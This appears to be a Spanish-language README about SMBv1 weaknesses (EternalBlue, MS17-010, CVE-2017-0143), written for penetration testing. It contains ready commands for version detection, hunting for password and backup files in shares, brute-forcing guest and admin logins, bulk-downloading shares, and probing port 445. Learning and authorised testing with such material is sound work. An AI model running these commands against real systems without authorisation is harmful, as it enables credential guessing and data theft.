```
███████╗███╗   ███╗██████╗              ███║
██╔════╝████╗ ████║██╔══██╗             ║██║
███████╗██╔████╔██║██████╔╝    ██║   ██ ║██║
╚════██║██║╚██╔╝██║██╔══██╗    ╚██╗ ██ ╔╝██║
███████║██║ ╚═╝ ██║██████╔╝     ╚████╔╝  ██║
╚══════╝╚═╝     ╚═╝╚═════╝       ╚═══╝   ╚═╝
```
SMB es un protocolo de red que permite compartir archivos, impresoras y otros recursos entre maquinas. 
SMB v1 (Server Message Block versión 1), inseguro y obsoleto para compartir archivos en red.

**SMB v1 - Inseguro !!!**

- Sin cifrado: Transmite datos en texto plano, incluyendo usuarios y contraseñas.

- Vulnerabilidades graves: Explotado por malware 

- WannaCry: Ransomware que afectó a millones en 2017. EternalBlue: Exploit desarrollado por la NSA, usado en WannaCry.

- NotPetya: Malware que causó pérdidas billonarias.

- Múltiples vulnerabilidades documentadas (CVE-2017-0143, etc.).

**Detectar version:**

- nxc smb 10.0.0.1
- smbclient -L //10.0.0.1/ -m NT1  
- nmap -Pn -sVC -p 139,445 10.0.0.1 --script smb-vuln-ms17-010

**otros comandos rapidos**
- sudo mount -t cifs //10.0.0.1/Public /mnt -o guest

- Busca archivos específicos en shares

for share in $(smbclient -L //192.168.1.100 -N 2>/dev/null | awk '/Disk/ {print $1}'); do
    echo "Buscando en $share:"
    smbclient -N //192.168.1.100/$share -c "ls *pass*; ls *backup*" 2>/dev/null
done

- Fuerza bruta SIMPLE con una sola password

for user in admin administrator guest test; do
    echo -n "Probando $user:password123... "
    smbclient -L //192.168.1.100 -U "$user%password123" 2>&1 | grep -q "session setup failed" && echo "FAIL" || echo "OK"
done

- Descarga TODO de un share (si tienes acceso)

smbclient -U "user%pass" //192.168.1.100/ShareName -c "prompt OFF; recurse ON; mget *"

- Chequeo rápido de EternalBlue (sin herramientas especiales)
echo -e "\x00\x00\x00\x90\xff\x53\x4d\x42\x25\x00" | nc -w1 192.168.1.100 445 | hexdump -C | head -5

**SMBv1:** vulnerabilidad CVE-2017-0143, gravedad 8.8, de ejecucion remota de codigo (RCE), en Windows con SMBv1 (ms17-010)

***EthernalBlue*** es un exploit creado por la NSA como herramienta de ciberseguridad. El nombre oficial del exploit, proporcionado por Microsoft, es **MS17-010**. Este exploit no es específico de dispositivos Windows, sino que afecta a cualquier dispositivo compatible con el protocolo de servidor SMBv1 de Microsoft

<img style="float:left" alt="SMBv1" src="https://github.com/hackingyseguridad/smb/blob/main/smb.png">

SMBv1 en: Microsoft Windows Vista SP2; Windows Server 2008 SP2 y R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold y R2; Windows RT 8.1 y Windows 10 Gold, 1511 y 1607 y Windows Server 2016 permite a atacantes remotos ejecutar código arbitrario a través de paquetes manipulados, vulnerabilidad también conocida como "Windows SMB Remote Code Execution Vulnerability". Esta vulnerabilidad es distinta de aquellas descritas en CVE-2017-0144, CVE-2017-0145, CVE-2017-0146 y CVE-2017-0148.

https://www.exploit-db.com/exploits/41891

https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html

#
http://www.hackingyseguridad.com/
#
